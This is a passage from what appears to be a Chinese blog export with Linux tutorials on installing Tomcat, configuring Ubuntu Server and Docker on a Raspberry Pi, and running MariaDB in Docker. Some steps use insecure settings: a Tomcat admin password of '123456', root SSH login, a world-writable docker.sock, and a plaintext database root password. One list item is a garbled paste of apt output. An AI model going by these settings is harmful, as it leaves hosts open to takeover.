<h1 id="安装过程">2. 安装过程</h1>
<ol type="1">
<li>将下载好的 Tomcat 安装包，拷贝至 Ubuntu 系统中，cd 至 Tomcat 所在目录后，使用命令解压至指定路径下。
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">tar -zxvf apache-tomcat-7.0.94.tar.gz -C /home/boyce/App/</span><br></pre></td></tr></tbody></table></figure> &gt; 其中： &gt;
apache-tomcat-7.0.94.tar.gz：是下载的 Tomcat 文件名； &gt;
/home/boyce/App：是您想要存放安装软件的路径。</li>
</ol>
<figure>
<img src="/p/74ba6bba/解压Tomcat.webp" alt="解压Tomcat">
<figcaption aria-hidden="true">解压 Tomcat</figcaption>
</figure>
<ol start="2" type="1">
<li> 解压完成后，需要修改 bin 目录下的 startup.sh 和 shutdown.sh 文件。进入到 /home/boyce/App/apache-tomcat-7.0.94/bin/，选择上述两个文件，右键使用选择 gedit 打开，在最后一行之前，加入如下代码并保存。
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># tomcat environment,修改成你自己的Tomcat路径</span></span><br><span class="line"><span class="built_in">export</span> TOMCAT_HOME=/home/boyce/App/apache-tomcat-7.0.94</span><br></pre></td></tr></tbody></table></figure></li>
</ol>
<figure>
<img src="/p/74ba6bba/配置环境变量.webp" alt="配置环境变量">
<figcaption aria-hidden="true">配置环境变量</figcaption>
</figure>
<ol start="3" type="1">
<li>输入如下命令，启动 Tomcat，并访问 127.0.0.1:8080，如果显示 Apache
Tomcat 页面，则表明启动成功。 <figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /home/boyce/App/apache-tomcat-7.0.94/bin</span><br><span class="line"><span class="built_in">sudo</span> ./startup.sh</span><br></pre></td></tr></tbody></table></figure></li>
</ol>
<figure>
<img src="/p/74ba6bba/Tomcat启动页面.webp" alt="Tomcat启动页面">
<figcaption aria-hidden="true">Tomcat 启动页面</figcaption>
</figure>
<ol start="4" type="1">
<li><p>此外，可通过修改 tomcat 目录下的 conf/tomcat-user.xml 配置文件，在 <code>&lt;/tomcat-user&gt;</code> 之前加入如下代码，添加超级管理员用户。
</p><figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">role</span> <span class="attr">rolename</span>=<span class="string">"manager-gui"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">role</span> <span class="attr">rolename</span>=<span class="string">"admin-gui"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span> <span class="attr">username</span>=<span class="string">"boyce"</span> <span class="attr">password</span>=<span class="string">"123456"</span> <span class="attr">roles</span>=<span class="string">"manager-gui,admin-gui"</span>/&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>按照第 5 步重新启动 Tomcat，进入 Apache
Tomcat 页面后，点击右侧的 Manager
App 按钮，输入第 6 步配置的管理员用户名和密码，如果登录成功，进入 manager 页面，则表明添加的用户有效。
<img src="/p/74ba6bba/Manager页面.webp" alt="Manager页面"></p></li>
<li><p>到此，在 Ubuntu 下安装 Tomcat 就完成了。</p></li>
</ol>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Ubuntu</tag>
        <tag>Tomcat</tag>
      </tags>
  </entry>
  <entry>
    <title>【Linux】基于树莓派 4B 安装 Ubuntu Server 系统及必要配置</title>
    <url>/p/1b1c0bcb.html</url>
    <content><![CDATA[<h1 id="前期准备">1. 前期准备</h1>
<table>
<colgroup>
<col style="width: 4%">
<col style="width: 12%">
<col style="width: 83%">
</colgroup>
<thead>
<tr class="header">
<th>序号</th>
<th>名称</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td> 1</td>
<td> 树莓派 4B</td>
<td> 规格：ARM Cortex-A72 1.5GHz (四核) + 4GB 内存</td>
</tr>
<tr class="even">
<td> 2</td>
<td>SD 卡</td>
<td>根据自身需要选择容量即可，建议尽量选择 A1 及以上级别的卡</td>
</tr>
<tr class="odd">
<td> 3</td>
<td>Ubuntu 系统</td>
<td>根据树莓派型号及配置选择，下载页面：https://ubuntu.com/download/raspberry-pi</td>
</tr>
<tr class="even">
<td>4</td>
<td>ssh 连接工具</td>
<td> MobaXterm、Xshell 等，根据个人习惯选择即可</td>
</tr>
</tbody>
</table>
<span id="more"></span>
<hr>
<h1 id="烧录系统">2. 烧录系统</h1>
<p>  烧录系统至 SD 卡的方式及软件有很多种，根据自身的使用习惯选择即可。
  推荐使用官网的 <a href="https://www.raspberrypi.org/software/">Raspberry Pi Imager</a> 或 <a href="https://www.balena.io/etcher/">balenaEtcher</a>。</p>
<ol type="1">
<li>将 SD 卡插入电脑，打开烧录软件。</li>
<li>选择预先准备好的系统镜像，选择 SD 卡盘符，点击 <code>Flash</code> 按钮，稍等片刻，即可完成。</li>
</ol>
<figure>
<img src="https://ae01.alicdn.com/kf/U58b80d364a8d437d98b2877975948a61D.jpg" alt="选择img和SD卡">
<figcaption aria-hidden="true">选择 img 和 SD 卡</figcaption>
</figure>
<figure>
<img src="https://ae01.alicdn.com/kf/Ud9fff857a46448948ab384b6c9ae64c07.jpg" alt="烧录系统中">
<figcaption aria-hidden="true">烧录系统中</figcaption>
</figure>
<hr>
<h1 id="修改网络配置">3. 修改网络配置</h1>
<ol type="1">
<li><p>系统烧录完毕后，需要重新插拔一下 SD 卡，系统会识别到 <code>System Boot</code> 盘符，打开其中的 <code>network-config</code> 文件，
取消约 10-21 行的注释，并修改 WiFi 名称和密码。 &gt;
注意：WiFi 名字和 WiFi 密码均需要使用双引号 <code>"</code> 包含起来。
</p><figure class="highlight properties"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">wifis</span>:<span class="string"></span></span><br><span class="line">  <span class="attr">wlan0</span>:<span class="string"></span></span><br><span class="line">    <span class="attr">dhcp4</span>: <span class="string">true</span></span><br><span class="line">    <span class="attr">optional</span>: <span class="string">true</span></span><br><span class="line">    <span class="attr">access-points</span>:<span class="string"></span></span><br><span class="line">      <span class="attr">"Your</span> <span class="string">Wifi Name":</span></span><br><span class="line">        <span class="attr">password</span>: <span class="string">"Your Wifi Password"</span></span><br></pre></td></tr></tbody></table></figure> <strong><em>备注</em></strong> ：
如果启动后仍无法连接网络，则执行以下步骤。<p></p></li>
<li><p>查看当前的网卡信息 </p><figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># 无线网卡一般是：wlan0，以太网卡一般是：eth0</span></span><br><span class="line">ip link</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>启用无线网卡 </p><figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line">ip link <span class="built_in">set</span> wlan0 up</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>创建配置文件 </p><figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># 需要使用sudo，或者直接切换成root用户，SSID、Password是你要连接的WiFi名称和密码</span></span><br><span class="line">sudo wpa_passphrase <span class="string">"&lt;SSID&gt;"</span> <span class="string">"&lt;Password&gt;"</span> &gt; /etc/wpa_supplicant/wpa_supplicant.conf</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>加载配置文件并启动 </p><figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># 结束当前的wpa_supplicant程序，防止受影响</span></span><br><span class="line">sudo killall wpa_supplicant</span><br><span class="line"></span><br><span class="line"><span class="comment"># wlan0需要修改成第1步查到的无线网卡名称</span></span><br><span class="line">sudo wpa_supplicant <span class="literal">-Bc</span> /etc/wpa_supplicant/wpa_supplicant.conf <span class="literal">-i</span> wlan0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动网络连接，wlan0同样根据实际情况修改</span></span><br><span class="line">dhclient wlan0</span><br></pre></td></tr></tbody></table></figure><p></p></li>
</ol>
<hr>
<h1 id="配置系统软件源">4. 配置系统软件源</h1>
<ol type="1">
<li>由于 ubuntu 默认的软件源是国外的，对于咱们国内来说，速度简直就像蜗牛。如下几个是国内速度比较快的镜像源，可根据个人习惯选择，另外还有像中科大、网易 163 等镜像源，此处就不一一列举了。
&gt; 华为开源镜像站: https://mirrors.huaweicloud.com/ &gt;
清华大学开源软件镜像站:
https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/ &gt; 阿里云开源镜像站:
https://developer.aliyun.com/mirror/ubuntu <figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># 1. 备份原sources.list</span></span><br><span class="line">sudo <span class="built_in">cp</span> /etc/apt/sources.list /etc/apt/sources.list.bak</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 编辑sources.list文件</span></span><br><span class="line">sudo nano /etc/apt/sources.list</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 删除原有内容，替换为如下内容(以清华源为例)</span></span><br><span class="line"><span class="comment"># 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释</span></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse</span><br><span class="line"><span class="comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse</span></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal<span class="literal">-updates</span> main restricted universe multiverse</span><br><span class="line"><span class="comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse</span></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal<span class="literal">-backports</span> main restricted universe multiverse</span><br><span class="line"><span class="comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse</span></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal<span class="literal">-security</span> main restricted universe multiverse</span><br><span class="line"><span class="comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 预发布软件源，不建议启用</span></span><br><span class="line"><span class="comment"># deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse</span></span><br><span class="line"><span class="comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse</span></span><br></pre></td></tr></tbody></table></figure></li>
</ol>
<hr>
<h1 id="安装ifconfig命令">5. 安装 ifconfig 命令</h1>
<ol type="1">
<li>默认的 Ubuntu 系统并未自带 ifconfig 命令，如果需要使用其相关的功能，则需要手工安装。安装命令如下。
<figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line">sudo apt<span class="literal">-get</span> update</span><br><span class="line">sudo apt<span class="literal">-get</span> install net<span class="literal">-tools</span></span><br></pre></td></tr></tbody></table></figure></li>
</ol>
<h1 id="重置root用户密码">6. 重置 root 用户密码</h1>
<ol type="1">
<li>执行如下命令，输入当前用户密码后，再输入两次新的 root 用户密码即可。
<figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line">sudo passwd root</span><br></pre></td></tr></tbody></table></figure></li>
</ol>
<h1 id="安装ssh并启用远程连接">7. 安装 ssh 并启用远程连接</h1>
<ol type="1">
<li><p>安装 openssh-server </p><figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line">sudo apt install openssh<span class="literal">-server</span></span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>查看 ssh 服务是否正常启动 </p><figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># 状态是：active(running)</span></span><br><span class="line">systemctl status ssh</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>启动远程连接 </p><figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># 编辑配置文件</span></span><br><span class="line">sudo nano /etc/ssh/sshd_config</span><br><span class="line"></span><br><span class="line"><span class="comment"># 找到PermitRootLogin，修改为yes</span></span><br><span class="line">PermitRootLogin yes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启ssh服务</span></span><br><span class="line">systemctl restart ssh</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>使用同一局域网下的电脑，利用 ssh 工具验证是否可以正常 ssh 连接。</p></li>
</ol>
<hr>
<h1 id="安装docker">8. 安装 Docker</h1>
<ol type="1">
<li><p>清除原有 docker 相关的环境 </p><figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line">sudo apt<span class="literal">-get</span> remove docker docker<span class="literal">-engine</span> docker.io</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>安装 docker 依赖 </p><figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line">sudo apt<span class="literal">-get</span> install apt<span class="literal">-transport-https</span> ca<span class="literal">-certificates</span> <span class="built_in">curl</span> gnupg2 software<span class="literal">-properties-common</span></span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>信任 Docker 的 GPG 公钥 </p><figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">curl</span> <span class="literal">-fsSL</span> https://download.docker.com/linux/ubuntu/gpg | sudo apt<span class="literal">-key</span> add -</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>添加 Linux 软件仓库</p>
<ul>
<li>对于 <code>amd64</code> 架构计算机 <figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line">sudo <span class="built_in">add-apt</span><span class="literal">-repository</span> \</span><br><span class="line">   <span class="string">"deb [arch=amd64] https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/ubuntu \</span></span><br><span class="line"><span class="string">   <span class="variable">$</span>(lsb_release -cs) \</span></span><br><span class="line"><span class="string">   stable"</span></span><br></pre></td></tr></tbody></table></figure></li>
<li>对于<code>树莓派armhf</code> 计算机 <figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"deb [arch=armhf] https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/ubuntu \</span></span><br><span class="line"><span class="string">     <span class="variable">$</span>(lsb_release -cs) stable"</span> | \</span><br><span class="line">    sudo <span class="built_in">tee</span> /etc/apt/sources.list.d/docker.list</span><br></pre></td></tr></tbody></table></figure></li>
<li>对于<code>树莓派arm64</code> 计算机 <figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"deb [arch=arm64] https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/ubuntu \</span></span><br><span class="line"><span class="string">     <span class="variable">$</span>(lsb_release -cs) stable"</span> | \</span><br><span class="line">    sudo <span class="built_in">tee</span> /etc/apt/sources.list.d/docker.list</span><br></pre></td></tr></tbody></table></figure></li>
</ul></li>
<li><p>执行如下命令，更新索引文件并安装 </p><figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line">sudo apt<span class="literal">-get</span> update</span><br><span class="line"><span class="comment"># amd64架构</span></span><br><span class="line">sudo apt<span class="literal">-get</span> install docker<span class="literal">-ce</span></span><br><span class="line"><span class="comment"># arm架构</span></span><br><span class="line">sudo apt<span class="literal">-get</span> install docker.io</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>设置当前用户具备 docker 执行权限 </p><figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># 将当前用户添加到docker组</span></span><br><span class="line">sudo gpasswd <span class="literal">-a</span> <span class="variable">$</span>{USER} docker</span><br><span class="line"><span class="comment"># 重启docker服务</span></span><br><span class="line">sudo systemctl restart docker</span><br><span class="line"><span class="comment"># 修改文件读写权限</span></span><br><span class="line">sudo chmod a+rw /var/run/docker.sock</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>修改 docker 仓库源 </p><figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc/docker</span><br><span class="line"><span class="comment"># 新建daemon.json文件，如有则跳过</span></span><br><span class="line">sudo touch daemon.json</span><br><span class="line"></span><br><span class="line"><span class="comment"># 编辑daemon.json文件，写入如下内容</span></span><br><span class="line">sudo nano daemon.json</span><br></pre></td></tr></tbody></table></figure> <figure class="highlight json"><table><tbody><tr><td class="code"><pre><span class="line"><span class="punctuation">{</span></span><br><span class="line">  <span class="attr">"registry-mirrors"</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">"https://registry.docker-cn.com"</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">}</span></span><br></pre></td></tr></tbody></table></figure>
<figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># 重载daemon.json文件以生效</span></span><br><span class="line">sudo systemctl daemon<span class="literal">-reload</span></span><br><span class="line"><span class="comment"># 重启docker服务</span></span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></tbody></table></figure><p></p></li>
</ol>
<hr>
<h1 id="docker下安装pi-dashboard树莓派监控工具">9.
Docker 下安装 pi-Dashboard（树莓派监控工具）</h1>
<ol type="1">
<li>执行以下命令，即可自动获取 pi-Dashboard 镜像，并启动
<figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line">sudo docker run <span class="literal">-d</span> <span class="literal">--name</span> docker<span class="literal">-pi-dashboard</span> <span class="literal">--restart</span>=always <span class="literal">-e</span> <span class="string">'LISTEN=1024'</span> <span class="literal">--net</span>=host ecat/docker<span class="literal">-pi-dashboard</span></span><br></pre></td></tr></tbody></table></figure></li>
<li>查看容器是否启动成功 <figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line">docker <span class="built_in">ps</span> | grep <span class="string">'dashboard'</span></span><br></pre></td></tr></tbody></table></figure></li>
</ol>
<hr>
<h1 id="docker下安装portainer容器可视化工具">10.
Docker 下安装 Portainer（容器可视化工具）</h1>
<ol type="1">
<li>拉取 portainer 镜像。 <figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line">docker pull portainer/portainer<span class="literal">-ce</span></span><br></pre></td></tr></tbody></table></figure></li>
<li>查看下载的镜像。 <figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></tbody></table></figure></li>
<li>启动 portainer 容器，注意需要修改最后的 image_id，可由上一步查询出。
<figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line">docker run <span class="literal">-dit</span> <span class="literal">-p</span> <span class="number">9000</span>:<span class="number">9000</span> <span class="literal">--restart</span>=always <span class="literal">-v</span> /var/run/docker.sock:/var/run/docker.sock <span class="literal">--name</span> portainer {image_id}</span><br></pre></td></tr></tbody></table></figure></li>
<li>浏览器访问:http://rasp-ip:9000，设置管理员账户和登录密码即可。</li>
</ol>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Ubuntu</tag>
        <tag>树莓派</tag>
      </tags>
  </entry>
  <entry>
    <title>【Linux】树莓派 arm64 位 Ubuntu 系统基于 docker 安装 MariaDB 数据库</title>
    <url>/p/91c89f1d.html</url>
    <content><![CDATA[<h1 id="背景">1. 背景</h1>
<p>  由于树莓派的 CPU 是 ARM 架构，在使用 docker 拉取 MySQL 数据库镜像时，会提示找不到与 <code>linux/arm64/v8</code> 匹配的镜像。而 MariaDB 数据库是属于 MySQL 的一个分支，完全兼容 MySQL，所以可以成为 MySQL 的替代品。
  本篇博客，将记录如何在 arm64 位 Ubuntu 系统的树莓派上，基于 docker 容器部署 MariaDB 数据库。</p>
<span id="more"></span>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">boyce@raspberry:~$ docker pull mysql</span><br><span class="line">Using default tag: latest</span><br><span class="line">latest: Pulling from library/mysql</span><br><span class="line">no matching manifest <span class="keyword">for</span> linux/arm64/v8 <span class="keyword">in</span> the manifest list entries</span><br></pre></td></tr></tbody></table></figure>
<hr>
<h1 id="拉取镜像">2. 拉取镜像</h1>
<p>  执行以下步骤之前，确认树莓派上已安装好 docker，并正常运行。可参考<a href="/p/1b1c0bcb.html#8-安装Docker" target="_blank">《【Linux】基于树莓派
4B 安装 Ubuntu Server 系统及必要配置》</a>第 8 章节。</p>
<ol type="1">
<li>xxxxxxxxxx24&nbsp;1pi@raspberrypi:~ $ sudo apt update2 命中：1
http://mirrors.tuna.tsinghua.edu.cn/raspberrypi buster InRelease3 命中：2
https://mirrors.tuna.tsinghua.edu.cn/debian buster InRelease4 获取：3
https://mirrors.tuna.tsinghua.edu.cn/debian buster-updates InRelease
[51.9 kB] 5 获取：4 https://mirrors.tuna.tsinghua.edu.cn/debian
buster-backports InRelease [46.7 kB] 6 获取：5
https://mirrors.tuna.tsinghua.edu.cn/debian-security buster/updates
InRelease [65.4 kB] 7 获取：6 https://mirrors.tuna.tsinghua.edu.cn/debian
buster-updates/main armhf Packages [9,488 B] 8 获取：7
https://mirrors.tuna.tsinghua.edu.cn/debian buster-updates/main
Translation-en [6,834 B] 9 获取：8
https://mirrors.tuna.tsinghua.edu.cn/debian buster-updates/non-free
armhf Packages [604 B] 10 获取：9
https://mirrors.tuna.tsinghua.edu.cn/debian buster-updates/non-free
Translation-en [673 B] 11 获取：10
https://mirrors.tuna.tsinghua.edu.cn/debian buster-backports/main armhf
Packages [440 kB] 12 获取：11 https://mirrors.tuna.tsinghua.edu.cn/debian
buster-backports/main Translation-en [381 kB] 13 获取：12
https://mirrors.tuna.tsinghua.edu.cn/debian buster-backports/contrib
armhf Packages [8,320 B] 14 获取：13
https://mirrors.tuna.tsinghua.edu.cn/debian buster-backports/contrib
Translation-en [8,132 B] 15 获取：14
https://mirrors.tuna.tsinghua.edu.cn/debian buster-backports/non-free
armhf Packages [13.0 kB] 16 获取：15
https://mirrors.tuna.tsinghua.edu.cn/debian buster-backports/non-free
Translation-en [36.4 kB] 17 获取：16
https://mirrors.tuna.tsinghua.edu.cn/debian-security buster/updates/main
armhf Packages [262 kB] 18 获取：17
https://mirrors.tuna.tsinghua.edu.cn/debian-security buster/updates/main
Translation-en [142 kB] 19 获取：18
https://mirrors.tuna.tsinghua.edu.cn/debian-security
buster/updates/non-free Translation-en [344 B] 20 已下载 1,308 kB，耗时
9 秒 (150 kB/s) 21 正在读取软件包列表...
完成 22 正在分析软件包的依赖关系树 23 正在读取状态信息... 完成 24 有 853
个软件包可以升级。请执行 ‘apt list --upgradable’ 来查看它们。bash
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">boyce@raspberry:~$ <span class="built_in">sudo</span> apt update</span><br><span class="line">[<span class="built_in">sudo</span>] password <span class="keyword">for</span> boyce: </span><br><span class="line">Hit:1 https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports groovy InRelease</span><br><span class="line">Hit:2 https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports groovy-updates InRelease</span><br><span class="line">Hit:3 https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports groovy-backports InRelease</span><br><span class="line">Hit:4 https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports groovy-security InRelease</span><br><span class="line">Hit:5 https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/ubuntu groovy InRelease</span><br><span class="line">Reading package lists... Done</span><br><span class="line">Building dependency tree       </span><br><span class="line">Reading state information... Done</span><br><span class="line">All packages are up to <span class="built_in">date</span>.</span><br></pre></td></tr></tbody></table></figure></li>
<li>执行 <code>docker search mariadb</code> 命令，搜索镜像。
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">boyce@raspberry:~$ docker search mariadb</span><br><span class="line">NAME                                   DESCRIPTION                                     STARS               OFFICIAL            AUTOMATED</span><br><span class="line">mariadb                                MariaDB Server is a high performing open sou…   3977                [OK]                </span><br><span class="line">linuxserver/mariadb                    A Mariadb container, brought to you by Linux…   198                                     </span><br><span class="line">bitnami/mariadb                        Bitnami MariaDB Docker Image                    134                                     [OK]</span><br><span class="line">toughiq/mariadb-cluster                Dockerized Automated MariaDB Galera Cluster …   40                                      [OK]</span><br><span class="line">mariadb/server                         MariaDB Server is a modern database <span class="keyword">for</span> mode…   35                                      [OK]</span><br><span class="line">colinmollenhour/mariadb-galera-swarm   MariaDb w/ Galera Cluster, DNS-based service…   32                                      [OK]</span><br><span class="line">webhippie/mariadb                      Docker images <span class="keyword">for</span> MariaDB                       22                                      [OK]</span><br><span class="line">panubo/mariadb-galera                  MariaDB Galera Cluster                          22                                      [OK]</span><br><span class="line">lsioarmhf/mariadb                      ARMHF based Linuxserver.io image of mariadb     17                                      </span><br><span class="line">bianjp/mariadb-alpine                  Lightweight MariaDB docker image with Alpine…   15                                      [OK]</span><br><span class="line">mariadb/maxscale                       MariaDB MaxScale - The world<span class="string">'s most advanced…   13                                      [OK]</span></span><br><span class="line"><span class="string">centos/mariadb-101-centos7             MariaDB 10.1 SQL database server                12                                      </span></span><br><span class="line"><span class="string">jc21/mariadb-aria                      Extension of the mariadb image that forces a…   7                                       </span></span><br><span class="line"><span class="string">centos/mariadb-102-centos7             MariaDB 10.2 SQL database server                6                                       </span></span><br><span class="line"><span class="string">wodby/mariadb                          Alpine-based MariaDB container image with or…   5                                       [OK]</span></span><br><span class="line"><span class="string">tiredofit/mariadb-backup               MariaDB Backup image to backup MariaDB/MySQL…   4                                       [OK]</span></span><br><span class="line"><span class="string">circleci/mariadb                       CircleCI images for MariaDB                     3                                       [OK]</span></span><br><span class="line"><span class="string">kitpages/mariadb-galera                MariaDB with Galera                             2                                       [OK]</span></span><br><span class="line"><span class="string">clearlinux/mariadb                     MariaDB relational database management syste…   2                                       [OK]</span></span><br><span class="line"><span class="string">rightctrl/mariadb                      Mariadb with Galera support                     2                                       [OK]</span></span><br><span class="line"><span class="string">tiredofit/mariadb                      Docker MariaDB server w/ S6 Overlay, Zabbix …   2                                       [OK]</span></span><br><span class="line"><span class="string">centos/mariadb-103-centos7             MariaDB 10.3 SQL database server                1                                       </span></span><br><span class="line"><span class="string">demyx/mariadb                          Non-root Docker image running Alpine Linux a…   0                                       </span></span><br><span class="line"><span class="string">ansibleplaybookbundle/mariadb-apb      An APB which deploys RHSCL MariaDB              0                                       [OK]</span></span><br><span class="line"><span class="string">jelastic/mariadb                       An image of the MariaDB SQL database server …   0                                       </span></span><br></pre></td></tr></tbody></table></figure></li>
<li>执行 <code>docker pull mariadb</code> 命令，拉取镜像。
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">boyce@raspberry:~$ docker pull mariadb</span><br><span class="line">Using default tag: latest</span><br><span class="line">latest: Pulling from library/mariadb</span><br><span class="line">32d7611b468c: Pull complete </span><br><span class="line">e5be16fdc306: Pull complete </span><br><span class="line">a361e87bde5e: Pull complete </span><br><span class="line">324b95d44184: Pull complete </span><br><span class="line">c7a02ed92077: Pull complete </span><br><span class="line">8ea02edf9bf7: Pull complete </span><br><span class="line">7f24c9bd9fe3: Pull complete </span><br><span class="line">0d6d5537d6c9: Pull complete </span><br><span class="line">309e2f0e8909: Pull complete </span><br><span class="line">1414d2a5d07d: Pull complete </span><br><span class="line">274f2315346c: Downloading [=========&gt;        ]  40.87MB/86.65MB</span><br><span class="line">4dbfe2815f55: Download complete </span><br></pre></td></tr></tbody></table></figure></li>
<li>执行 <code>docker images</code> 命令，查看镜像信息，记录 images ID。
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">boyce@raspberry:~$ docker images</span><br><span class="line">REPOSITORY                 TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">mariadb                    latest              939d05495a90        9 days ago          387MB</span><br><span class="line">portainer/portainer-ce     latest              2e772d0e71ce        5 weeks ago         174MB</span><br><span class="line">ecat/docker-pi-dashboard   latest              94eea793ce1a        2 years ago         222MB</span><br></pre></td></tr></tbody></table></figure></li>
</ol>
<hr>
<h1 id="启动容器">3. 启动容器</h1>
<ol type="1">
<li>创建一个本地路径，用于存放数据库文件。 <figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p <span class="variable">$HOME</span>/app/mariadb/data</span><br></pre></td></tr></tbody></table></figure></li>
<li>按照如下格式，修改后以启动容器。 <figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">docker run -d --name mariadb -p 3306:3306 -e MYSQL_ROOT_PASSWORD=hxIWKqbfVAYpdKiC -v <span class="variable">$HOME</span>/app/mariadb/data:/var/lib/mysql mariadb</span><br></pre></td></tr></tbody></table></figure></li>
</ol>
<hr>
<h1 id="数据库配置">4. 数据库配置</h1>
<h2 id="新建数据库">4.1. 新建数据库</h2>
<ol type="1">
<li>到了这一步，MariaDB 数据库就已经部署好了。接下来，可以使用 Navicat 等软件，连上数据库试试。
<img src="https://ae01.alicdn.com/kf/U2857bcc711384cb5be919e1f7bd2bcacB.jpg" alt="测试数据库连接"></li>
<li>右键连接名，新建一个数据库。 <img src="https://ae01.alicdn.com/kf/Uc132c35b7dbb4888b701b1028c8d532du.jpg"></li>
</ol>
<h2 id="新建用户并授权">4.2. 新建用户并授权</h2>
<ol type="1">
<li>按照如下格式，创建一个用于连接 <code>testDB</code> 数据库的用户，并授予相应的权限。
